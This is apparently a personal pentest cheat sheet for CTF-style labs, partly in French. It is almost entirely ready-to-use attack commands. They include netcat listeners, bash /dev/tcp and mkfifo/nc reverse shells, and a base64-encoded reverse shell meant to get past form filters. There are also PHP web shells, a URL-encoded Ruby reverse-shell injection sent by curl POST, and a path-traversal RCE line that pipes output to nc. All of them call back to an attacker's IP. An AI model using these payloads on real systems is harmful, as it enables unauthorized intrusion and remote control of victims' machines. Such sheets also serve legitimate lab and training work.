
## _SSH Command Execution_
```
ssh -p 2220 bandit18@bandit.labs.overthewire.org -t "cat /home/bandit18/readme"
```

# reverShells
## _listener on a local port_
```
rlwrap nc -lvnp 1234
```
## _reverse shell from the remote server_
```
bash -i >& /dev/tcp/@IP/1234 0>&1
``` 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.16.108 1234 >/tmp/f
```
### can encode payload in Base64 
	marche pour les formulaire
```
echo -n 'bash -i >& /dev/tcp/10.10.17.161/1234 0>&1' | base64 -w 0
```
```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjEvMTIzNCAwPiYx | base64 -d | bash
```
## _Create end send a reverse shell php file to webvictim_
```
echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.108 1234 >/tmp/f"); ?>' > shell.php
```
```
echo "<?php system("bash -c 'bash -i >& /dev/tcp/10.201.1.201/1234 0>&1'");?>" > shell.php
```
## _form post_
```
curl 'http://remote@ip' -X POST -d 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60'
```
	| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
	| `curl -X POST http://remot@IP/.%0d./.%0d./.%0d./bin/sh -d 'id | nc L@IP port'` | RCE
## _to allow the call backs on port 80 and 443 to our machine_
```
ufw allow from adresseip proto tcp to any port 80,443
```
